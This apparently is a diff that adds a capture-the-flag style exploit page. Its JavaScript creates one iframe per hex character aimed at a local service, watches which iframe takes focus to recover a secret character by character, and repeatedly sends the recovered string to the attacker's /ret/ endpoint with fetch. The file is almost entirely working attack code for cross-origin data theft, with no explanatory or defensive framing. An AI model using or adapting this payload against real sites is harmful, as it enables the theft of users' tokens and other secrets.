@@ -1,0 +1,41 @@
+<body>
+    <a id=focusme href=#>sth</a>
+    <script>
+        const sleep = d => new Promise(r => setTimeout(r, d));
+        alphabet = "0123456789abcdef-"
+
+        //create iframes
+        for (var i = 0; i < alphabet.length; i++) {
+            iframe = document.createElement("iframe");
+            iframe.name = alphabet[i];
+            iframe.src = "http://localhost:12345/";
+            document.body.appendChild(iframe);
+        }
+
+        //array for found characters
+        hovered = []
+
+        const main = async () => {
+            // every 0.075 secs check for iframes' onfucus event
+            setInterval(() => {
+                p = document.activeElement.name
+                if (p) {
+                    // if there's focus on an iframe -- add its character to hovered and change the focus
+                    hovered.push(p);
+                    document.getElementById("focusme").focus();
+                }
+            }, 75)
+
+            await sleep(2000);
+            c = open(`/c.html`);
+            await sleep(2000 + 150);
+
+            // every 500 secs send found characters to our server endpoint /ret/:characters
+            setInterval(() => {
+                fetch(`/ret/${hovered.join("")}`)
+            }, 500);
+        }
+
+        main();
+    </script>
+</body>
